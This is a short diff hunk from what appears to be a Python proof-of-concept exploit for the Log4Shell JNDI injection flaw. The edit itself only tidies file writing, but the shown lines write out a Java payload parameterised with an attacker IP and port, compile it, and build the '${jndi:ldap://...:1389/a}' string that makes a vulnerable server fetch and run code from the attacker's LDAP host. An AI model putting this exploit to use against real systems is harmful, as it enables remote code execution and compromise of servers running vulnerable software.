@@ -52,10 +52,8 @@ public class Exploit {
 
 """) % (userip,lport)
 
-    f = open("Exploit.java", "w")
-    f.write(javapayload)
-    f.close()
-
+    with open("Exploit.java", "w") as f:
+        f.write(javapayload)
     os.system('./jdk1.8.0_20/bin/javac Exploit.java')
 
     sendme = ("${jndi:ldap://%s:1389/a}") % (userip)
